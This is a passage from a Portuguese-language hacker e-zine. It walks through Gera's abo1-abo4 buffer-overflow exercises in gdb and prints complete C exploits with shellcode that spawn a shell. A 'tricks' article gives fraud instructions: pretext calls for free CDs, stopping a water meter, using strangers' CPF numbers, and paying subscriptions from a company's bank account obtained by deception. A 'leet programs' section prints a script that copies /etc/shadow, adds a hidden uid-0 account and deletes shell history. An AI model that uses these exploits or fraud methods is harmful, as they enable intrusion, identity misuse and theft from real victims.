buffer aki eh 256 caracteres. Agora ficou simples... mas vamos testa-lo 
antes com o gdb...


[root@struck xplt]# gdb vul
...
(gdb) set args `perl -e "print 'a'x256;"`
(gdb) run
...
Program exited with code 054.


   Parece que tudo ocorreu bem. Agora vamos ver o que acontece qdo 
enchemos mais do que 256 bytes. Como queremos atingir um endereco de 
memoria usaremos 4 bytes a mais.


(gdb) set args `perl -e "print 'a'x260;"`
(gdb) run
...
Program received signal SIGSEGV, Segmentation fault.
0x4003520b in _dl_pagesize () from /lib/libc.so.6
(gdb)


   Aki tivemos algum problema... De certa forma sobrescrevemos o return 
address, porem nao foi como planejado. Enchemos o buffer com 'a's portanto 
o ret addr deveria ser 0x61616161. Mas entao como o programa foi parar no 
endereco 0x4003520b??
   Eu poderia explicar isto, mas fugiria um pouco do objetivo do texto. Se 
quizer descobrir, basta depurar o programa colocando um break point antes 
da funcao main retornar e entao analize a stack. Se voce fizer isto notara 
que o endereco de retorno foi sobrescrito pelo '\0' que eh colocado pelo 
strcpy() no final da string.
   Logo, para sobrescrevemos o ret addr com um valor conhecido, basta 
colocarmos mais 4 bytes no nosso buffer...


(gdb) set args `perl -e "print 'a'x264;"`
(gdb) run
...
Program received signal SIGSEGV, Segmentation fault.
0x61616161 in ?? ()


   Ae esta'... Tudo o que o exploit precisa fazer eh redirecionar o 
programa para um shellcode e pronto.

<++> insec/abo1xplt.c
/* abo1.c Exploit
 * by Cheat Struck <cheat@struck.8m.com>
 */

#define BUFFER 256

int offset=400;
char b0f[BUFFER+8];

/*Cheat Struck's L4M3 shellcode*/
char sc[]=
   "\x31\xc0\xb0\x04\x31\xdb\xfe\xc3\xeb\x2b\x5e\x8d\x4e\x07"
   "\x31\xd2\xb2\x14\xcd\x80\x31\xc0\xb0\x0b\x31\xd2\x89\x76"
   "\x08\x88\x56\x07\x89\xf3\x8d\x4e\x08\x89\x56\x0c\x8d\x56"
   "\x0c\xcd\x80\x31\xc0\x89\xc3\xfe\xc0\xcd\x80\xe8\xd0\xff"
   "\xff\xff/bin/shStruck's shellcode.\n";

long getsp() {
   __asm__(" movl %esp, %eax");
}

main(int argc, char *argv[]) {
   register int i;
   char *b;
   long addr, *ptr;

   memset(b0f,0x90,sizeof(b0f));
   b=b0f+(BUFFER-sizeof(sc)+1);
   for(i=0; sc[i]; i++)
      *(b++) = sc[i];

   if (argc > 1) offset=atoi(argv[1]);
   addr=getsp()-offset;
   printf("Trying Address: 0x%x\n\n", addr);

   ptr=(long *)b;
   *(ptr++)=addr;
   *(ptr++)=addr;

   execl("./abo1","abo1",b0f,0);

}
<-->


   Voalah! Ae esta a solucao do problema 1.
   Agora vamos ao 2o.


<++> insec/abo2.c
/* abo2.c                                                   *
 * specially crafted to feed your brain by gera@core-sdi.com */

/* This is a tricky example to make you think               *
 * and give you some help on the next one                   */

int main(int argv,char **argc) {
        char buf[256];

        strcpy(buf,argc[1]);
        exit(1);
}
<-->


   Aki temos um problema... o programa nao sai de modo normal, ele utiliza 
exit() para sair e portanto nao retorna da funcao main pelo ret addr. 
Podemos encher o buffer o quanto quizer que nada ocorerra':


[root@struck insec]# gdb abo2
...
(gdb) set args `perl -e "print 'a'x50000;"`
(gdb) run
...
Program exited with code 01.


   Viram? nem mesmo colocando 50.000 bytes no buffer foi possivel causar 
alguma redirecao em seu fluxo de execucao.
   Minha conclusao aki eh de que neste caso seje impossivel exploitar tal 
programa pois nao importa qtos bytes sejam carregados no buffer, a saida 
do programa eh feita pela funcao exit() e nao pelo retorno do main. Se 
alguem discorda ou tenha conseguido algo neste programa, favor entre em 
contato.
   Portanto vamos ao 3o programa:

<++> insec/abo3.c
/* abo3.c                                                    *
 * specially crafted to feed your brain by gera@core-sdi.com */

/* This'll prepare you for The Next Step                     */

int main(int argv,char **argc) {
        extern system,puts;
        void (*fn)(char*)=(void(*)(char*))&system;
        char buf[256];

        fn=(void(*)(char*))&puts;
        strcpy(buf,argc[1]);
        fn(argc[2]);
        exit(1);
}

<-->

   Aqui vemos um ponteiro de funcao sendo carregado com a funcao puts() e 
usando argc[2] como argumento para ela. Porem tambem vemos que a string 
buf pode ser sobrecarregada mudando assim o valor do ponteiro de funcao *fn.
   O que devemos fazer aqui entao eh: sobrecarregar buf causando um buffer 
overwrite no ponteiro *fn, apontando-o para a funcao system() e finalmente 
passar "/bin/sh" como segundo argumento (que sera usado com o system). O 
resultado sera um system("/bin/sh").


[root@struck insec]# gdb abo3
...
(gdb) info addr system
Symbol "system" is at 0x804834c in a file compiled without debugging.


   Aki esta o endereco da funcao system. Agora basta fazer o exploit...


<++> insec/abo3xplt.c
/* abo3.c Exploit 
 * by Cheat Struck
 */

#define BUFFER 256

char b0f[BUFFER+4];

long addr=0x804834c;   //Endereco do system()

main(int argc, char *argv[]) {
   register int i;

   printf("Trying Address: 0x%x\n\n",addr);
   for(i=0; i<sizeof(b0f); i+=4)
      *(long *) &b0f[i]=addr;

   execl("./abo3","abo3",b0f,"/bin/sh",0);
}
<-->


   Bem simples heim??
   Finalmente vamos ao ultimo programa desta noite...


<++> insec/abo4.c
/* abo4.c                                                    *
 * specially crafted to feed your brain by gera@core-sdi.com */

/* After this one, the next is just an Eureka! away          */

extern system,puts;
void (*fn)(char*)=(void(*)(char*))&system;

int main(int argv,char **argc) {
        char *pbuf=malloc(strlen(argc[2])+1);
        char buf[256];

        fn=(void(*)(char*))&puts;
        strcpy(buf,argc[1]);
        strcpy(pbuf,argc[2]);
        fn(argc[3]);
        while(1);
}
<-->


   Este eh um pouco mais complicado que os anteriores... Vou dar 1 minuto 
para voce pensar no que fazer...
   E ae? conseguiu?? Vejamos o que temos... um buffer overflow na string 
buf, uma variavel dinamica que recebe o valor de argc[2] e um ponteiro 
para funcao que recebe puts() e usar argc[3] como argumento.
   Entao aki faremos o seguinte: 
1. Sobre carregamos buf para causar buffer overwrite em *pbuf apontando-o 
   para o ponteiro de funcao *fn.
2. Como argc[2] passamos o endereco de system(). Este valor sera colocado 
   em *fn ja que anteriormente *pbuf passou a apontar para *fn.
3. Como argc[3] passamos "/bin/sh" que sera executado pelo *fn (system).


[root@struck insec]# gdb abo4
...
(gdb) info addr fn
Symbol "fn" is at 0x80495cc in a file compiled without debugging.
(gdb) info addr system
Symbol "system" is at 0x8048374 in a file compiled without debugging.


   Agora eh soh codar o xploit...


<++> insec/abo4xplt.c
/* abo4.c Exploit 
 * by Cheat Struck
 */

#define BUFFER 256

char b0f[BUFFER+4];

long addr=0x8048374;   //Endereco do system().
long addr2=0x80495cc;  //Endereco do fn.


main(int argc, char *argv[]) {
   register int i;
   char aux[5];

   printf("Trying Address: 0x%x\n\n",addr);
   for(i=0; i<sizeof(b0f); i+=4)
      *(long *) &b0f[i]=addr2;

   *(long *) &aux[0]=addr;

   execl("./abo4","abo4",b0f,aux,"/bin/sh",0);
}
<-->


   Com isso encerramos nossa maratona de programacao insegura, mostrando 
as falhas de funcoes muito usadas e seus devidos metodos de exploitacao.
   Espero que tenham gostado pq dae talvez edicao que vem tenha mais.. =P










        _xXXXP^''                             ``^YXXXx_
     _xXXXXP~      12 - Uma Breve Visao sobre     ~YXXXXx_
  _xXXXXXX(             o Futuro                    )XXXXXXx_
xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
  ~YXXXXXX(                                         )XXXXXXP~
     ~YXXXXb_                Behael               _dXXXXP~
        ~YXXXbx..                             ..xdXXXP~

   Bem... Este espaco estava reservado para a materia do Behael sobre
Programacao Logica, Inteligencia Artificial, Redes Neurais, etc... Como
a materia acabou ficando muito grande (123Kb) optei por nao publica-la
aki pois o tamanho desta edicao iria crescer consideravelmente.
   Portanto caso voce esteje interessado no assunto, estarei disponibi-
lisando o texto na struck.securitynetworks.com.br.
   Eh um otimo material de pesquisa para quem quer inteirar-se mais do
assunto. Estes sao os topicos do texto:

[1] Intro.
[2] Pr-Requisitos.
[3] Inteligncia Artificial.
[4] Vida Artificial.
[5] Agentes.
[6] Bioinformatica.
[7] CyberSpace.
[8] Redes Neurais Artificiais.
[9] Prolog.










        _xXXXP^''                    ``^YXXXx_
     _xXXXXP~        13 - Truques,       ~YXXXXx_
  _xXXXXXX(       trickZ e faucatruaZ      )XXXXXXx_
xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
  ~YXXXXXX(                                )XXXXXXP~
     ~YXXXXb_          onlooker          _dXXXXP~
        ~YXXXbx..                    ..xdXXXP~





    HACKERS. Dizem que eles esto em falta. Dizem que eles so produtos do passado...
    ...quando se valorizava honra e justia. Quando as pessoas se arriscavam a fazer o
    que achavam que era certo. Quando os crackers faziam algo em comum... ...e diziam 
    que era exatamente igual...
    Mas, se o hacker  um individuo que est disposto a mostrar suas virtudes, custe o 
    que custar... ...ele vai se arriscar em dizer a verdade, sobre como devemos ser, 
    como os verdadeiros devem portar-se, como a cultura est se perdendo em mos dos 
    que no acreditam em tica coletiva, que acham que tica  uma coisa pessoal de 
    cada um, que devem julgar a seu modo... ento ainda h hackers. E temos sorte por
    isso."


    [  uma forma de expressar a revolta e polemica que gera sobre a palavra tica nesse    ]
    [  momento, em qual lado estaremos? Nenhum, voc escolhe sua prpria lenda, sua tica, ]
    [  se preferir dizer assim. Faa o que quiser..                                        ]


    
    

    * Os textos apresentados na zine no expressam necessariamente a opinio da Fatal 3rror.

      





   Adivinha!? introduo!!
   Introducao e o mesmo blablabla de sempre.

  Oi, 

  Primeiramente, peo desculpas, mas no pra vocs.  pro struck, era pra eu
  ter escrito pra f3-06 e nem deu. Sem problemas, isso por um lado foi at bom, 
  pois me deu tempo pra pesquisar algumas coisas a mais. O ttulo  mesmo tudo, 
  voc ir aprender a tirar um pouco de proveito desse mundo que apenas nos mostra 
  sua fria. Estes so pequenos, mas valiosos truques. Estive pensando em escrever 
  algumas pequenas tcnicas usadas por detetives pra colher informaes das pessoas. 
  Isso iria parecer muito engenharia social, da qual muitos falam e realmente poucos 
  so hbeis na maneira de convencer e fazer as pessoas aderirem a seus propsitos.
  Uma das coisinhas que poderemos desfrutar, so as assinaturas de revistas. Isso
  sim  algo importante, espero que ningum cometa erros, pois seno o esquema vasa
  e vou ter que bolar outras maneiras pra ter todas as revistas em casa...
  As pessoas esto escrevendo mais sobre phreak, campo em que no sei quase nada, mas
  arrisco a dar algumas dicas. 


  No quero deixa-los com sede, ento eis aqui os truques.


  1. CDs de graa

  Vou direto ao ponto. Essa  muito manjada, o esquema  voc ligar pra editoras
  e dizer que o CD que acompanha a revista no funciona.
  Ter que ser convincente e colher informaes. Por exemplo, voc est querendo
  muito o linux que aquela revista est disponibilizando, mas est sem um tosto.
  No fique com raiva, apenas anote a edio da revista. Uma forma  acessar o
  site da revista e 'checar' por edies anteriores. Leia o que a revista traz e
  o CD, pegando o nome e tudo.
  Pra ilustrar, vamos ganhar a PC Master 50, na qual tem uma distribuio bastante
  interessante, o Debian 2.2 R3.

  - Al? Oi, por favor, pode passar para o suporte tcnico?
  - Sim, aguarde um momento.
  - Al, suporte, no que posso ajudar?
  - Ah sim, olha, eu comprei a revista que tm o Debian e o cd no est pegando!
  - Por favor, o senhor no est conseguindo instalar o sistema operacional?
  - No, o cd no est lendo.
  - Ok, qual o problema?
  - Eu o coloco no drive e ele no l!
  - Isso acontece com outros CDs?
  - No, e sei que o problema  no CD, no no drive >:/
  - Est bem, vou estar testando um CD pra voc, e mandando um CD novo...
  - T.
  - Estaria pedindo seus dados. Nome,
  - xxxx
  (d os dados pra ele, de sua residencia mesmo.)
  
  Dentro de 3 a 4 dias chega pra voc o Cd.

  Pra no falar que est  uma coisa tosca, aqui est apenas alguns telefones.
  Na prxima edio fao uma lista bem grande de revistas, DVDs e tudo, ok?
  
  Editora Europa - Revistas: Revista do CD-ROM, PC Master, VideoSom&Cia,
  Revista do DVD, CD-ROM Fcil, CD-ROM Escola.
  Telefone: 11. 3038.5070 		Site: www.europanet.com.br

  Editora CD Expert - Revistas: PC Expert, PC Gamer e afins.
  Telefone: xx. xxxxxxxxx 	Site: www.cdexpert.com.br

  Editora Digerati  - Revistas: Geek, Arquivo Linux, Hackerz mais.
  Telefone: xx. xxxxxxxxx 		Site: www.digerati.com.br

  Editora Escala - Revistas: Vrias!
  Telefone: xx. xxxxxxxxx   		Site: www.escala.com.br

- A lista com telefones mais informaes sai na prxima edio.
  Por enquanto s da Europanet! =)

----------------------------------------

  2.0 gua de Graa

  Este  mais um truque bastante bizarro.
  O esquema  fazer o relgio parar. Vrias pessoas sabem fazer. Mas advirto, no
  v querer fazer 'rodar pra trs', porque o relgio pode estragar.

  Esta dica  apenas para os relgios de gua que tem uma camada protetora de
  plstico. Algumas so de ferro, e no d.
  Observe que o relgio tm algumas roletas, que indicam o uso em metros cbicos. 
  Vo girando conforme voc gasta gua (srio?!). Um registro deve ter seis ou mais
  marcadores independentes.
  Apenas esquente uma agulha bem fina e fure atras no relgio, furando completamente, 
  at atravessar a fina camada de plstico do relogio.

     <detalhes>
     
      o seguinte, voc vai ter que colocar a agulha exatamente onde vem
     o primeiro numero(deve ser estar pintado de vermelhor), pois no 
     adianta nada voc travar o ultimo, neh? Segue-se assim:

                                |
                                |
      __________________________|_
     /                          | \
    | [9][8][7][6][5][4][3] (2)(1) |
    |                              |
    | xxxxx                 XXXXX  |
    |  xxx                 XXXXXXX |


  No sou bom desenhista mas deu pra entender n? Breve tiro uma foto pra explicar
  como funciona...

  Retire a agulha e deixe esfriar. Depois coloca ela travando o relgio. Apenas cuide-se
  com o dia de leitura do relgio, voc pode ser multado por isso. Sempre olhe na conta 
  quando ser o prximo dia de leitura, e destrave uns trs dias antes... Use bastante 
  gua nesse tempo, pois se eles desconfiarem que o consumo baixou uns 90%, eles vo 
  tentar descobrir o que h de errado. Veja o controle de metros cbicos consumidos em 
  outros meses (na conta de agua), e veja mais ou menos o quanto quer 'economizar'...
  Poderia ensinar o mtodo de luz... Pena que no e to fcil assim, envolve coisas
  muito maiores, e no quero ser responsabilizado pela morte de qualquer retardado que
  arrisque-se a fazer.

----------------------------------------

  3. Reabilitar Telefones Desligados Temporariamente

  Outra coisa que descobrimos facilmente. Foi testado com margem de 100% no Estado de
  So Paulo. Talvez seja a Telefnica 15 que nos ajude. Em qualquer outro estado deve
  ter um servio igual ao que citarei a seguir.

  J aconteceu de algum (seus pais) no quererem pagar a conta de telefone, s pra voc
  ficar sem internet? Pra deixar voc louco, sem poder bater bronha no nome daquela
  gata da playboy? Ou ligar pra minas que conhecemos nos chats?
  Ok, no  algo to dificil de fazer. O exemplo  pra todos de SP, mas podem ser feitos
  em outros estados, creio eu.

  Ligue pra 0800 77 15 104, o nmero de atendimento ao cliente Telefnica, digite seu
  seu numba:
  
  -  Telefnica, bom dia, tecle o numero de telefone a ser consultado.
  
  155471285 (este nmero  fictcio, portanto, no liguem!)

  -  Aguarde...
  
  Vai aparecer vrias opes, mas o que nos interessa  [conta telefonica]

  Tecle 3

  -  Tecle 4 para obter o valor da conta
  -  Tecle 5 para obter segunda via resumida
  -  Tecle 7 para confirmao de pagamento de telefone desligado
  -  Tecle 8 para informaes sobre tarifas
  -  Tecle 9 para outras informaes

  Tecle 7

  E da em diante,  s seguir as instrues. Se o telefone no estiver
  desligado, ser avisado. Se estiver desligado, informar a data de corte e
  conta atrasada. S pra voc saber,  atendimento automtico. Vo informar
  que estaro fazendo a operao depois do horrio comercial, e vai ser
  confirmado ao banco a quitao da divida. No ligue, se fizer isso antes
  das 16 horas, noutro dia s 12:00 j estar ligado.
  
----------------------------------------

  4. Como descobrir CPFs e CGCs verdadeiros.

  No menospreze!  muito importante ter CPFs, principalmente quando os
  provedores grtis esto querendo mais e mais dados do usario.
  Pra no dar dados seus, use o dos outros.
  A melhor maneira  procurar em jornais regionais, editais. Sempre convocam
  algum pra uma reunio ou coisa qualquer.

  Existem nmeros aos milhares. Com Nome e Endereo e todos os dados das pessoas.
   assim, voc pode usar esses dados at pra investiagar a vida dessa pessoa,
  e obter dados valiosos,  s ser criativo.
  Primeiro, veja se ele est regularizado, em:
  http://www.receita.fazenda.gov.br/PessoaFisica/CPF/ConsultaPublica.asp
  Vai ter mais dados agora.
  Cadastre no iG ou qualquer merda que pea CPF.
  E guarde o nmero pra gente usar depois.

----------------------------------------

  5. Assinaturas de revistas.
  
  Ah, espero que saibam o que fazem. Vamos assinar revistas na Editora Abril.
  Pode at dar certo em outras editoras, desde que trabalhem com 'dbito automtico'.
  Os telefones da Abril so:
  Grande So Paulo	: 	11.	3990-2121
  Outras Localidades	: 	0800	 701-2828
  De 2 a 6, das 8h s 22h.

  As Revistas que eles oferecem pra assinatura so:
  Veja . Almanaque Abril . Superinteressante . Info Exame . Exame .
  Voc S.A . Quatro Rodas . Placar . Playboy . VIP . Claudia . Nova .
  Capricho . Contigo . Revista da Web . Minha Novela . Ao Games .

  E vrias outras.  s pra voc ter uma idia.

  Ligue pra l e aja como se voc fosse assinar a revista mesmo. No v
  ser retardado de tentar dizer que leu o esquema aqui, eles no vo te
  gratificar com isso.

  D todas as informaes e quando pedirem o modo de pagamento, opte por
  dbito automtico. Aqui voc d s o numero da conta e agencia que eles
  j aceitam.

  Ondem arranjar estes dados? Pegue o Estado de Segunda-feira, caderno de
  Informtica. Veja um anuncio bem grande, de uma empresa bem famosa.
  Ligue pra l e se passe como um comprador (ligue dum tp). Fale que est
  no inteior e no pode ir pagar no balco. Exponha que pode estar fazendo
  um depsito no valor do computador, e passando um faz pra confirmar.
  Eles te daro os dados da conta deles... Agora j os tem.
  (edio que vem ensino como 'ganhar' este computador do exemplo)

  Passe os dados pra Abril e seja feliz.

  Entendimento: A empresa que foi usada jamais vai perceber que sumiu o
  valor de uma assinatura na conta corrente. Eles mexem com dinheiro alto,
  e a conta  muito movimentada... Por que acham melhor que se envie um fax?
  Porque eles no vo ficar tirando extrato a cada venda.

----------------------------------------

  6. Finauz.

  Desculpem se no ficou bem esclarecido algumas coisas. Me comprometo a
  continuar com o assunto do 'computador', mas advirto desde j que  estelionato
  e pode dar cadeia. Tambm estou afirmando que vou gravar em MP3 os golpes
  e disponibilizar pra download em algum lugar da minha pgina. Afinal, j
  olharam a nova onlooker.hpg.com.br? O esqueleto j est pronto, com novo
  visual. Abraos, onlooker.







  No preciso de modelos, no preciso de heris. Eu tenho minha prpria vida, e
  quem decide por ela sou eu.









        _xXXXP^''                    ``^YXXXx_
     _xXXXXP~   14 - SUPER L33T PROGIES  ~YXXXXx_
  _xXXXXXX(                                )XXXXXXx_
xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
  ~YXXXXXX(                                )XXXXXXP~
     ~YXXXXb_           S}{adow          _dXXXXP~
        ~YXXXbx..                    ..xdXXXP~

   Esta secao ta' sendo muito disputada. O povo comecou a se puchar para 
fazer programas elitos somente para serem publicados aki.
   A escolha para essa edicao foi dificil... Porem ao rever minha mailbox 
achei esta materia que havia sido rejeitada para edicoes passadas. Soh que 
relendo o programa descobri que ele realmente eh da elite. Portanto aki 
esta a materia enviada por S}{adow na integra.
   Nota: no final da materia farei mais alguns comentarios...



------------------------------------------------------------------------
PRA ZINE
Bem aqui estou eu mais uma vez, :-( ESSE CARA DE NOVO )-: 
Bem basicamente soh quero apresentar um programinha feito por mim...
Quantas vezes vc conseguiu root no sistema e teve que fazer o processos 
manualmente, isso eh chato naum? Eh, e muito foi pensando nisso que 
pensei putz naum quero perder tempo e vou fazer um prog que cumpra todas
as rotinas que eu queira rapidamente e soh mandar pra maquina e rodar...
O que ele faz:
Basicamente ele pega todos os arquivos importantes do sistema (syslog, shadow, 
passwd, logins.defs .bash_history);
depois adiciona um root com o login shadow (daonde ser que eu tirei isso) e
depois apaga a bash_history(vc ja deve ter rodado o zap.c antes neh? ento 
agora soh eh necessrio apagar a .bash_history, depois de copi-la eh claro j 
que o zap naum apaga ela). Futuramente quero adicionar um backdoor e um 
logcleaner ao prog mas essa eh a primeira verso por isso tenham pacincia
quando terminar a GETALL v2.0 volto a publica-lo.

                   BY S}{adow wexhenry@hobbiton.org

<++> Superprogs/getall.c
main()
{
     char ch;

     printf(" \n\n");
     printf("                        ** GETALL V1.0 **   \n");
     printf("             ...: BY S}{ADOW wexhenry@hobbiton.org :....\n\n\n");
     printf("Deseja pegar os arquivos e adicionar novo root? (S/N)");
                ch = getchar();

        switch(ch){
     case 'S':
             get();
     case 'n':
             cancelado();
     case 's':
             get();
     case 'N':
             cancelado();
     default:
             printf("\n\nDigite SIM ou NO para fazer tudo isso!\n\n\n");
shad();
exit(1);
     }
}

get()
{
     system("clear");
     printf("           *Pegando arquivos...\n\n");
     system("get /etc/passwd passwd");
     system("get /etc/shadow shadow");
     system("get /etc/syslog.conf syslog.conf");
     system("get /root/.bash_history bash_history");
     system("get /etc/login.defs login.defs");
     system("adduser shadow -o -g users -d /var/spool/ -s /bin/bash");
     system("rm /root/.bash_history");
     printf("     *** :-) arquivos capturados e novo root 0K (-: ***\n\n\n");
     shad();
     exit(1);
}

cancelado()
{
     system("clear");
     printf("*** Que bosta, por que vc cancelou seu h4x0r de circo? :-( ***\n\n");
     shad();
     exit(1);
}

shad()
{
      printf(" by S}{adow wexhenry@hobbiton.org\n\n\n");

     exit(1);
}
<-->


------------------------------------------------------------------------


Comentarios de struck:
   Como deu pra notar acima, o programa foi muito bem escrito, usando 
printf("bla"); ao inves de system("echo bla"); e usando varias funcoes sem 
argumentos e sem retornos. Sem contar as diversas chamadas a exit(1);.
   Soh que em meus testes o programa nao funcionou muito bem. Espero que o 
problema seja apenas comigo e todos voces possam fazer belas hackeadas 
usando o getall. =)
   Aki esta o log dos erros apresentados na minha maquina...

sh: get: command not found
sh: get: command not found
sh: get: command not found
sh: get: command not found
sh: get: command not found

Looking for first available UID... 506
Looking for first available GID... 506

Adding login: shadow...done.
Creating mailbox: /var/spool/mail/shadow...done.

Don't forget to set the password.

The home directory for shadow was set to /home/shadow but the directory
was not created.  Be sure that you set it up properly.










        _xXXXP^''                    ``^YXXXx_
     _xXXXXP~      15 - My mailbox       ~YXXXXx_
  _xXXXXXX(                                )XXXXXXx_
xXXXXXXXXXXbxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxdXXXXXXXXXXx
YXXXXXXXXXXP^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^YXXXXXXXXXXP
  ~YXXXXXX(                                )XXXXXXP~
     ~YXXXXb_        Cheat Struck        _dXXXXP~
        ~YXXXbx..                    ..xdXXXP~

   Aki eh onde voce ajuda a fazer a zine... =P
   Heheh.. mandem emails para:

 cheat@struck.8m.com



##############################################
From :    "**********" <**********@bol.com.br>  
Subject :    Feliz Aniversrio!!  
Date :    Sat, 10 Nov 2001 23:14:15 -0300  
   
>                        Parabns jovem mancebo!!!!
>   Ateh q enfim vc passou de fase!!!! Quem diria, jah eh
>quase um homem...E eu q te conheci quando vc era apenas
>um pequenino gurizinho saltitante...
>   Falando mais ou menos srio, tudo de bom pra ti neste
>seu novo momento de maioridade...
>   Sade,paz e  dinheiro pra vir me buscar para
>viajarmos pelo mundo...
>   Um beijo ...de preferncia na boca...
>                     BELE
-----------------------------------------------------------

   Aeeeee. Foi a unica que lembrou do meu aniversario.
   Belos amigos que eu tenho heim. =~
   Bele: um chupao na tua lingua! :***



#############################
From :    "*********" <********@terra.com.br>  
Subject :    100 assunto. Hehehehehe  
Date :    Sat, 1 Dec 2001 19:29:48 -0300  
   
>Ae kra, tipo preciso d uma mo tua veio, leio a Fatal 3rror, pesquiso
>(e muito) sobre tcnicas hackers, ateh og, no axei um modo prtico q
>ensinasse como invadir por ip e telnet. Juro, nada funfa, ou tah
>desatualizado, como por exemplo, invaso por ip com windows 95. Porra
>eu uso u rWINDOWS ME, q kraio mesmo, kra c jah foi lamah, todos
>comeam d baixo, preciso d algo q realmente funcione, como por
>exemplo, invaso por telnet, pode parecer q jah tah meio arcaico, mas
>jah vi neguinhu invadi sistema com isso. E por tcp/ip, invaso por
>ip, kra u conteudo q eu tenho, porra mto mal explicado. Ae kra por
>favor me ajude, naum sou  baba-ovo, mas eu leio tuas zines desde o
>tempo da Cheat Stuck Zine, lembra? A part de Vivendo, se naum me
>engano era a mais show, ensinava a jogah fliper d gratis, mas eh
>claro q eu gostava + da part d compilao de virii e talz.
>Kra responda a esse e-mail por favor, me de algumas dicas, na boa
>curto mto u teu "Trabalho", por favor kra me de algumas noes.
>Lembre-se: "U lamah d og eh u hacker d amanh" Chico Xavier.
>Huahauhauhauahuahua. Naum serinhu, o veio sei q ning t ensinou, mas
>porra as peskisa da inet eh foda, mto desatualizado.
>VAleu pelo tempo q c demorou p/ ler esse e-mail.
>Obrigado.
-----------------------------------------------------------

   Se voce tivesse pesquisado tanto o qto diz, nao taria ae fazendo essas
perguntas idiotas agora. Heheheh.. mas ta blza, pq as vezes vc ta 
pesquizando nos lugares errados. Esqueca as porra de page rackers do 
cade, google, etc... Vai em www.txt.org e pega la a maior qtidade de
textos e zines q tu conseguir... le tudo, absorve e c mesmo tem q
selecionar o que presta e o que nao presta.
   Qto a invasao de ip e telnet. Esqueca isso! Isso nao existe!
   O que pode existir no caso do windows eh uma falha na compartilhamento de
arquivos q acabou sendo batizada(provavelmente por um lamer) de invasao por 
ip. Isso ja eh tao antigo que somente os rackers de calculadora ainda poem
isso nas suas paginas.
   Invasao de telnet deve consistir em acessar o servico de telnet e tentar
exploitar localmente o sistema. Tb pode ser q seja exploitar o daemon de telnet
mas no seu caso achu q nao.



############################################
From :    "*********" <*********@bol.com.br>  
Subject :    new zine  
Date :    Wed, 9 Jan 2002 02:44:48 -0200  
   
>ae manow! aqui  o tecnet lembra que eu at te mandei
>a traduo de uma matria pra publicar na fatal 3rror?
>tipo  o seguinte, est surgindo uma nova zine hacker
>inspirada na sua e como sabemos que vc sempre apoia os
>que to comeando. Pr isso lhe pedimos para vc publicar
>esse e-mail na a zine. Noso endereo :
>www.thirdeye.8m.com --> tem um link pra sua hp lah
>OBS: se vc achar nosso site parecido com o seu, no 
>mera coincidncia, ns queriamos fazer um site l33t ento
>pensamos vamos nos inspirar em algum da elite pra
>faze-lo. Pagaes de pau a parte, thanks for all!
-----------------------------------------------------------

   Ta feita ae a propaganda da zine entao.. =)
   Aproveitei para le-la e como voces pedem la para fazerem criticas a
zine, vou tomar da uns toques: 
   1o. Como a page foi feita com base na minha, achei q provavelmente 
       as zines tb ficariam parecidas. Porem me enganei, vcs mostraram
       um estilo proprio e autenticidade, o q eh mto bom.
   2o. Vcs tem um grupo com bom potencial e bem humorado, eh legal ler
       materias que fazem graca com assuntos tratados seriamente.
   3o. Nao facam como mtas zines q surgiram por ae, q jogam qquer merda
       no pacote apenas para acumularem edicoes. Selecionem melhor o que
       sera publicado. 
   Esta ultima critica pode ter soado sarcastica ja q algumas materias q
vcs publicaram foram rejeitadas por mim. =)
   Assim como a f3 ja influenciou o nascimento de mtas zines, tb fez com que
outras acabassem. A 3rdEye ainda esta longe de ser uma das melhores zines 
hackers do Brasil (tanto pq ainda esta na 1a edicao) como esta no site de
vcs. Porem tem qualidade e eh mto superior a varias zines ja lancadas no
Brasil. Fazer com que ela c torne uma das melhores e nao somente mais uma
zine brasileira cabe a vcs.
   Essas criticas tem como objetivo ajudar no crescimento da zine (caso
minhas palavras tenham sido mau interpretadas). =)


######################################
From :    "*****" <*****@terra.com.br>  
Subject :    Iae Struck!  
Date :    Mon, 7 Jan 2002 11:53:57 -0300  
   
>Iae struck... aki eh o mild7, tah lembrado?
>Tava meio sumido, estudando.. hehee :)
>kra... PASSEI NA PUC! :)
>dia 9 to indo lah ver a matricula e talz...
>andei visitando lah, vi o Lapro, o CPD e achei tudo mtu show...
>bom, to indo pq eu tenho que trabalhar, hehehehe
>um abrao,
-----------------------------------------------------------

   Aeeeee.. meu bixo!!! Alias... bixo dos meus bixo!!!
   Vai sofre mto no trote!!!!


#########################
From :    ****@uol.com.br  
Subject :    VangarD  
Date :    Fri, 28 Dec 2001 18:34:01 -0200 (BRST)  
   
>VangarD era o nick que eu usava, alem de outros, primeiramente estou me
>apresentando, fui um cara mega-viciado em cpu, e hoje nao sou mais por 2 motivos
>principais, primeiro, mexer demasiadamente em cpu  vcio, so percebi qdo j era
>tarde,e ste (como qualquer outro) faz mal, traz prejuzos, e qdo colocados em
>uma balana os benefcios e malefcios, eu estava saindo perdendo, no tinha
>vida social, praticamente vivia para os computadores e para a rede, segundo,
>hoje estou na faculdade, fao medicina, e no momento precisava me dedicar aos
>vestibulares. Zines, brasileiros, sinceramente eu li quase todos, desde barata
>eltrica, at mesmo o seu, tenho uma certa experiencia, dizer que sou hacker,
>no, no sou hacker no, acho na verdade, ningum pode se auto-afirmar que  um
>HACKER. Pelo menos pra mim, o peso e o valor da palavra HACKER vai muito, mas
>muito alm de invadir sistemas, e botar medo em outros usurios. HACKER na minha
>concepo  um indivduo, que conhece os sistemas, seu funcionamento, suas 
>peculiaridades, em sua plenitude, e possui experiencia e pratica, para em uma
>situao desconhecida, saber o que deve ser feito.
>Bom estou fugindo totalmente do propsito deste e-mail, j pensei em escrever um
>zine, na poca tinha vrios amigos que manjavam muito, e eu estava super ligado
>nos assuntos do momento, naquela poca poderia ser feito, hoje no mais, por
>isso, para no levar meus conhecimentos gerais para o tmulo (hehe), acho que
